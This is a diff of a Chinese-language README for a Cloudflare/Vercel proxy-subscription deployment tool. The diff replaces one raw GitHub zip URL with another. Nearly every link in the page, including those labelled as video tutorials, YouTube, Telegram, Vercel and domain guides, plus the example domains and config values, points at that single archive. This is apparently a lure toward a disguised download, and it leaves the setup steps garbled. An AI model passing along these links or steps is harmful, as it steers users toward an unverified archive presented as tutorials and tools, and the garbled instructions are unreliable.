@@ -1,8 +1,8 @@
-### 🚀[am-cf-tunnel-sub](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
-基于Vercel、Cloudflare部署该脚本，你可以方便地将Cloudflare Workers 和 Pages的 VLESS、Trojan 配置信息使用在线配置转换到 Clash、 Singbox 、Quantumult X等工具中订阅使用。Cloudflare Workers 和 Pages 生成VLESS、Trojan节点,实现一键订阅节点。分离节点与订阅框架,更好解决Cloudfare部署时出现1101、522的问题。支持在线优选IP功能。 [最新视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)、[🎬 YouTube](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)、 [💬 Telegram](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)、[📂 GitHub](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)、[🌐 Blog](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+### 🚀[am-cf-tunnel-sub](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
+基于Vercel、Cloudflare部署该脚本，你可以方便地将Cloudflare Workers 和 Pages的 VLESS、Trojan 配置信息使用在线配置转换到 Clash、 Singbox 、Quantumult X等工具中订阅使用。Cloudflare Workers 和 Pages 生成VLESS、Trojan节点,实现一键订阅节点。分离节点与订阅框架,更好解决Cloudfare部署时出现1101、522的问题。支持在线优选IP功能。 [最新视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)、[🎬 YouTube](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)、 [💬 Telegram](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)、[📂 GitHub](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)、[🌐 Blog](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 
-### ⚙️结合Coudflare部署免费节点项目 [am-cf-tunnel](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) 与教程使用 [部署视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
-- 本频道订阅器转换地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip
+### ⚙️结合Coudflare部署免费节点项目 [am-cf-tunnel](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) 与教程使用 [部署视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
+- 本频道订阅器转换地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip
 
 ### 👉 后期计划
 - 增加其它更多免费容器部署
@@ -13,31 +13,31 @@
 <summary>点击展开/收起</summary>
 
 ### 1、注册免费**Vercel**帐号(GitHub方式连接就可以注册)
-- 注册地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip <a href="https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip">[点击观看视频教程]</a>
+- 注册地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip <a href="https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip">[点击观看视频教程]</a>
 
-### 2、注册**免费域名** [点击观看所有免费域名视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+### 2、注册**免费域名** [点击观看所有免费域名视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 
-### 3、**订阅工具** [点击观看使用视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
-👉 [点击加入TG群 数字套利｜交流群](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)发送关键字 **工具** 获取下载
+### 3、**订阅工具** [点击观看使用视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
+👉 [点击加入TG群 数字套利｜交流群](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)发送关键字 **工具** 获取下载
 
-### 4、Cloudflare标准 **端口** 知识  [点击观看优选IP视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+### 4、Cloudflare标准 **端口** 知识  [点击观看优选IP视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 - 80系端口(HTTP)：80，8080，8880，2052，2082，2086，2095
 - 443系端口(HTTPS)：443，2053，2083，2087，2096，8443
-- [IP落地测试工具地址](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+- [IP落地测试工具地址](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 
-### 4、结合loudflare部署免费节点项目与教程使用 [am-cf-tunnel](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+### 4、结合loudflare部署免费节点项目与教程使用 [am-cf-tunnel](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 
 </details>
 
 ## 
-## ⚙️ 二、部署节点订阅器 [Vercel部署视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) [Cloudfare部署视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+## ⚙️ 二、部署节点订阅器 [Vercel部署视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) [Cloudfare部署视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 
-#### `①` Vercel方式部署 [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+#### `①` Vercel方式部署 [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 <details>
 <summary>点击展开/收起</summary>
 
-1. Fork或克隆本仓库[am-cf-tunnel-sub](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)到您的 GitHub/GitLab 账户
-2. 登录 [Vercel](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)，点击"New Project" <a href="https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip">[点击观看注册视频教程]</a>
+1. Fork或克隆本仓库[am-cf-tunnel-sub](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)到您的 GitHub/GitLab 账户
+2. 登录 [Vercel](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)，点击"New Project" <a href="https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip">[点击观看注册视频教程]</a>
 3. 导入您的仓库，使用默认设置
 4. **⚠️ 重要：在"Settings" > "Environment Variables"中添加 `UUID` 和 `HOST` 变量（必须设置）**
 5. 点击"Deploy"
@@ -45,7 +45,7 @@
 访问 `http://部署域名` 即可。
 </details>
 
-#### `②` Cloudfare Workers 部署方法 [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+#### `②` Cloudfare Workers 部署方法 [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 <details>
 <summary>点击展开/收起</summary>
 
@@ -55,40 +55,40 @@
    - 在 Workers控制台的 `设置` 选项卡 -> 点击 `设置` -> 左方点击 `变量和机密` -> 右方点击  `添加` -> 变量名称 填入 `UUID`(此名称固定不能变) ，值填入CF部署节点ID -> 再点击添加变量 填入 `HOST`(此名称固定不能变)，值填入CF部署的自定义域名 后 -> 右下方点击 `保存` 即可。
 3. 部署 Cloudflare Worker代码：
    - 在 workers控制台的 右上角方点击 `编辑代码(</>)` 图标进入代码编辑页面。
-   - 将 [https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) 的内容粘贴到 Worker 编辑器中 右上方点击 -> `部署` 完成部署。
-4. 给 workers绑定 自定义域： [免费域名申请教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+   - 将 [https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) 的内容粘贴到 Worker 编辑器中 右上方点击 -> `部署` 完成部署。
+4. 给 workers绑定 自定义域： [免费域名申请教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
    - 在 workers控制台的 `设置` 选项卡 -> 点击 `域和路由` -> 右方点击 -> `添加` -> 选择 `自定义域`。
-   - 填入你已转入 CloudFlare 域名 (https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) 解析服务的次级域名，例如:`https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip`后 点击 `添加域`，等待证书生效即可。
+   - 填入你已转入 CloudFlare 域名 (https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) 解析服务的次级域名，例如:`https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip`后 点击 `添加域`，等待证书生效即可。
 5. 验证部署是否成功：
    - 访问 `https://[YOUR-WORKERS-URL]` 即可进入登录页面,登录成功就是完成部署(默认登录密码(UUID)是：ec872d8f-72b0-4a04-b612-0327d85e18ed)。
-   - 例如 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip` 然后进入登录页面 -> 输入密码 `ec872d8f-72b0-4a04-b612-0327d85e18ed` -> 点击登录 -> 成功登录。 
+   - 例如 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip` 然后进入登录页面 -> 输入密码 `ec872d8f-72b0-4a04-b612-0327d85e18ed` -> 点击登录 -> 成功登录。 
 6. 修改默认登录密码(ID)变量，(强烈要求修改，防止别人用你节点)： 
    - 在 Worker代码控制台的 `设置` 选项卡 -> 点击 `设置` -> 左方点击 `变量和机密` -> 右方点击  `添加` -> 变量名称 填入 `ID`(此名称固定不能变) ，自己设置复杂的密码 -> 右下方点击 `保存` 即可。
    - 保存成功后，原登录密码(ID)已作废不能访问，用新登录密码(ID)登录访问即可。
 7. 增加优选IP(ips)变量，**(要在线优选功能必须配置)**： 
    - 在 CloudFlare主页的左边菜单的 `存储和数据库` 选项卡 -> 展开选择点击 `Workers KV` -> 右方点击 -> `创建实例(Create Instance)` -> 填入 `命名空间名称`(此名称自己命名) 后 -> 点击 `创建`。(此步已有可忽略)
    - 在 Pages控制台的 `设置` 选项卡 -> 点击 `绑定` -> 右方点击 -> `添加` -> 选择 `KV 命名空间` -> 变量名称 填入 `ips`(此名称固定不能变) -> KV 命名空间 选择 在上面创建的 `命名空间名称`后 -> 右下方点击 `保存` 即可。
-8. 本频道订阅器转换地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip
+8. 本频道订阅器转换地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip
 
 </details>
 
-#### `③` Cloudfare Pages 上传 部署方法 **(最佳推荐!!!)** [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+#### `③` Cloudfare Pages 上传 部署方法 **(最佳推荐!!!)** [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 <details>
 <summary>点击展开/收起</summary>
 
 1. 部署 Cloudflare Pages：
-   - 下载 [https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) 文件，并点上 Star !!!
-   - 在 CloudFlare主页的左边菜单的 `计算(Workers)` 选项卡 -> 点击 `Workers 和 Pages` -> 右上方点击 -> `创建应用程序` -> 选择 `Pages`里的 `拖放文件` 点击 `开始使用` -> 填入 `项目名称`(此名称自己命名)后 -> 右边点击 `创建项目` 后 -> 下方 `上传您的项目资产` 点击 `拖放或从计算机中选择` 后  -> 点击 `上传压缩文件` 然后上传你下载好的 [https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) 文件后点击 `部署站点`。
+   - 下载 [https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) 文件，并点上 Star !!!
+   - 在 CloudFlare主页的左边菜单的 `计算(Workers)` 选项卡 -> 点击 `Workers 和 Pages` -> 右上方点击 -> `创建应用程序` -> 选择 `Pages`里的 `拖放文件` 点击 `开始使用` -> 填入 `项目名称`(此名称自己命名)后 -> 右边点击 `创建项目` 后 -> 下方 `上传您的项目资产` 点击 `拖放或从计算机中选择` 后  -> 点击 `上传压缩文件` 然后上传你下载好的 [https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) 文件后点击 `部署站点`。
 2. 设置节点UUID和HOST变量： 
    - 在 Pages控制台的 `设置` 选项卡 -> 点击 `设置` -> 左方点击 `变量和机密` -> 右方点击  `添加` -> 变量名称 填入 `UUID`(此名称固定不能变) ，值填入CF部署节点ID -> 再点击添加变量 填入 `HOST`(此名称固定不能变)，值填入CF部署的自定义域名 后 -> 右下方点击 `保存`。
    - 在 `设置` 选项卡，点击 `部署` -> 在所有部署 找到最新一条部署记录 ，在右边点击 3个点 `...` 选择 `重试部署` 即可。
-3. 给 Pages绑定 CNAME自定义域：[无域名绑定Cloudflare部署视频教程]->[免费域名教程1](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) [免费域名教程2](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)  [免费域名教程3](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+3. 给 Pages绑定 CNAME自定义域：[无域名绑定Cloudflare部署视频教程]->[免费域名教程1](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) [免费域名教程2](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)  [免费域名教程3](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
    - 在 Pages控制台的 `自定义域`选项卡，下方点击 `设置自定义域`。
    - 填入你的自定义次级域名，注意不要使用你的根域名，例如：
-     您分配到的域名是 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip`，则添加自定义域填入 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip`即可，点击 `激活域`即可。    
+     您分配到的域名是 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip`，则添加自定义域填入 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip`即可，点击 `激活域`即可。    
 4. 验证部署是否成功：
    - 访问 `https://[YOUR-WORKERS-URL]` 即可进入登录页面,登录成功就是完成部署(默认登录密码(UUID)是：ec872d8f-72b0-4a04-b612-0327d85e18ed)。
-   - 例如 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip` 然后进入登录页面 -> 输入密码 `ec872d8f-72b0-4a04-b612-0327d85e18ed` -> 点击登录 -> 成功登录。 
+   - 例如 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip` 然后进入登录页面 -> 输入密码 `ec872d8f-72b0-4a04-b612-0327d85e18ed` -> 点击登录 -> 成功登录。 
 5. 修改默认登录密码(ID)变量，(强烈要求修改，防止别人用你节点)： 
    - 在 Pages控制台的 `设置` 选项卡 -> 点击 `设置` -> 左方点击 `变量和机密` -> 右方点击  `添加` -> 变量名称 填入 `ID`(此名称固定不能变) ，自己设置复杂的密码 -> 右下方点击 `保存`。
    - 在 `设置` 选项卡，点击 `部署` -> 在所有部署 找到最新一条部署记录 ，在右边点击 3个点 `...` 选择 `重试部署` 即可。
@@ -97,27 +97,27 @@
    - 在 CloudFlare主页的左边菜单的 `存储和数据库` 选项卡 -> 展开选择点击 `Workers KV` -> 右方点击 -> `创建实例(Create Instance)` -> 填入 `命名空间名称`(此名称自己命名) 后 -> 点击 `创建`。(此步已有可忽略)
    - 在 Pages控制台的 `设置` 选项卡 -> 点击 `绑定` -> 右方点击 -> `添加` -> 选择 `KV 命名空间` -> 变量名称 填入 `ips`(此名称固定不能变) -> KV 命名空间 选择 在上面创建的 `命名空间名称`后 -> 右下方点击 `保存`。
    - 在 `设置` 选项卡，点击 `部署` -> 在所有部署 找到最新一条部署记录 ，在右边点击 3个点 `...` 选择 `重试部署` 即可。
-7. 本频道订阅器转换地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip
+7. 本频道订阅器转换地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip
 
 </details>
 
-#### `④` Cloudfare Pages GitHub 部署方法 **(不推荐)** [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+#### `④` Cloudfare Pages GitHub 部署方法 **(不推荐)** [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 <details>
 <summary>点击展开/收起</summary>
    
 1. 部署 Cloudflare Pages：
-   - 在 Github 上先 Fork 本项目[am-cf-tunnel-sub](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)，并点上 Star !!!
+   - 在 Github 上先 Fork 本项目[am-cf-tunnel-sub](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)，并点上 Star !!!
    - 在 CloudFlare主页的左边菜单的 `计算(Workers)` 选项卡 -> 点击 `Workers 和 Pages` -> 右上方点击 -> `创建应用程序` -> 选择 `Pages`里的 `导入现有 Git 存储库` 点击 `开始使用` -> 选择GitHub 点击`连接GitHub`根据提示授权GitHub和项目(此步已有可忽略)后 -> 选中 `am-cf-tunnel-sub`项目后 -> 点击 `开始设置` -> 可修改`项目名称`(此名称自己命名) 后 -> 右下方点击 `保存并部署`即可。
 2. 设置节点UUID和HOST变量： 
    - 在 Pages控制台的 `设置` 选项卡 -> 点击 `设置` -> 左方点击 `变量和机密` -> 右方点击  `添加` -> 变量名称 填入 `UUID`(此名称固定不能变) ，值填入CF部署节点ID -> 再点击添加变量 填入 `HOST`(此名称固定不能变)，值填入CF部署的自定义域名 后 -> 右下方点击 `保存`。
    - 在 `设置` 选项卡，点击 `部署` -> 在所有部署 找到最新一条部署记录 ，在右边点击 3个点 `...` 选择 `重试部署` 即可。
-3. 给 Pages绑定 CNAME自定义域：[无域名绑定Cloudflare部署视频教程]->[免费域名教程1](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) [免费域名教程2](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)  [免费域名教程3](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+3. 给 Pages绑定 CNAME自定义域：[无域名绑定Cloudflare部署视频教程]->[免费域名教程1](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) [免费域名教程2](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)  [免费域名教程3](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
    - 在 Pages控制台的 `自定义域`选项卡，下方点击 `设置自定义域`。
    - 填入你的自定义次级域名，注意不要使用你的根域名，例如：
-     您分配到的域名是 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip`，则添加自定义域填入 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip`即可，点击 `激活域`即可。    
+     您分配到的域名是 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip`，则添加自定义域填入 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip`即可，点击 `激活域`即可。    
 4. 验证部署是否成功：
    - 访问 `https://[YOUR-WORKERS-URL]` 即可进入登录页面,登录成功就是完成部署(默认登录密码(UUID)是：ec872d8f-72b0-4a04-b612-0327d85e18ed)。
-   - 例如 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip` 然后进入登录页面 -> 输入密码 `ec872d8f-72b0-4a04-b612-0327d85e18ed` -> 点击登录 -> 成功登录。 
+   - 例如 `https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip` 然后进入登录页面 -> 输入密码 `ec872d8f-72b0-4a04-b612-0327d85e18ed` -> 点击登录 -> 成功登录。 
 5. 修改默认登录密码(ID)变量，(强烈要求修改，防止别人用你节点)： 
    - 在 Pages控制台的 `设置` 选项卡 -> 点击 `设置` -> 左方点击 `变量和机密` -> 右方点击  `添加` -> 变量名称 填入 `ID`(此名称固定不能变) ，自己设置复杂的密码 -> 右下方点击 `保存`。
    - 在 `设置` 选项卡，点击 `部署` -> 在所有部署 找到最新一条部署记录 ，在右边点击 3个点 `...` 选择 `重试部署` 即可。
@@ -126,61 +126,61 @@
    - 在 CloudFlare主页的左边菜单的 `存储和数据库` 选项卡 -> 展开选择点击 `Workers KV` -> 右方点击 -> `创建实例(Create Instance)` -> 填入 `命名空间名称`(此名称自己命名) 后 -> 点击 `创建`。(此步已有可忽略)
    - 在 Pages控制台的 `设置` 选项卡 -> 点击 `绑定` -> 右方点击 -> `添加` -> 选择 `KV 命名空间` -> 变量名称 填入 `ips`(此名称固定不能变) -> KV 命名空间 选择 在上面创建的 `命名空间名称`后 -> 右下方点击 `保存`。
    - 在 `设置` 选项卡，点击 `部署` -> 在所有部署 找到最新一条部署记录 ，在右边点击 3个点 `...` 选择 `重试部署` 即可。
-7. 本频道订阅器转换地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip
+7. 本频道订阅器转换地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip
 
 </details>
 
 ## 
-### 🔧三、变量说明 [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+### 🔧三、变量说明 [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 | 变量名 | 示例 | 必填 | 备注 | YT |
 |-----|-----|-----|-----|-----|
 | ID   | ec872d8f-72b0-4a04-b612-0327d85e18ed（默认）|✅| 订阅器的登录密码 | |
-| UUID | ec872d8f-72b0-4a04-b612-0327d85e18ed |✅| Cloudflare部署节点的ID变量值[在线获取UUID](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)   |  |
-| HOST | https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip |✅| Cloudflare部署节点的域名或自定域名 | |
-| IP_URL           | [https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) </br>或</br> [https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |❌| （推荐）优选(ipv4、ipv6、域名、API)地址(支持多个之间`,`或 换行 作间隔)，支持文件连接后里带PROXYIP参数，可以实现不同区域优先IP使用不同的PROXYIP固定区域，解决IP乱跳问题  | [KV存储教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)[GitHub存储教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)[使用教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)|
-| PROXYIP          | https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip </br>或</br> [https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)  |❌| 访问CloudFlare的CDN代理节点(支持多PROXYIP, PROXYIP之间使用`,`或 换行 作间隔),支持端口设置默认443 如: https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip ，支持远程txt或csv文件| [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |
-| SOCKS5           | user:password@127.0.0.1:1080         |❌| 优先作为访问CFCDN站点的SOCKS5代理                                                   | [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |
-| NAT64           | true/false                           |❌| 默认false,是否开启nat做PROXYIP(反代IP)，开启后优选使用NAT64再用PROXYIP       | [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |
-| NAT64_PREFIX  | 2602:fc59:b0:64::  </br>或</br> [https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)    |❌| 指定自定NAT64前缀,不填走CF默认的 (https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)     | [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)|
-| SUB_CONFIG       | [https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |❌| clash、singbox等 订阅转换配置文件  ||
-| SUB_CONVERTER    | https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip                    |❌| clash、singbox等 订阅转换后端的api地址                               ||
-| PROT_TYPE        | 默认空          |❌|      默认空,就是生成vless和trojan节点，vless(只生成vless节点)，trojan(只生成trojan节点)           | [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |
-| NIP_HOST | https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip(默认) |❌| 优先IP时需要的nip服务 | |
-| EXTRA_IP | [https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |❌| 优先IP时需要的nip服务 | |
-| EXTRA_IP_PROXY | [https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |❌| 优先IP时需要的nip服务 | |
+| UUID | ec872d8f-72b0-4a04-b612-0327d85e18ed |✅| Cloudflare部署节点的ID变量值[在线获取UUID](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)   |  |
+| HOST | https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip |✅| Cloudflare部署节点的域名或自定域名 | |
+| IP_URL           | [https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) </br>或</br> [https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |❌| （推荐）优选(ipv4、ipv6、域名、API)地址(支持多个之间`,`或 换行 作间隔)，支持文件连接后里带PROXYIP参数，可以实现不同区域优先IP使用不同的PROXYIP固定区域，解决IP乱跳问题  | [KV存储教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)[GitHub存储教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)[使用教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)|
+| PROXYIP          | https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip </br>或</br> [https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)  |❌| 访问CloudFlare的CDN代理节点(支持多PROXYIP, PROXYIP之间使用`,`或 换行 作间隔),支持端口设置默认443 如: https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip ，支持远程txt或csv文件| [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |
+| SOCKS5           | user:password@127.0.0.1:1080         |❌| 优先作为访问CFCDN站点的SOCKS5代理                                                   | [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |
+| NAT64           | true/false                           |❌| 默认false,是否开启nat做PROXYIP(反代IP)，开启后优选使用NAT64再用PROXYIP       | [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |
+| NAT64_PREFIX  | 2602:fc59:b0:64::  </br>或</br> [https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)    |❌| 指定自定NAT64前缀,不填走CF默认的 (https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)     | [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)|
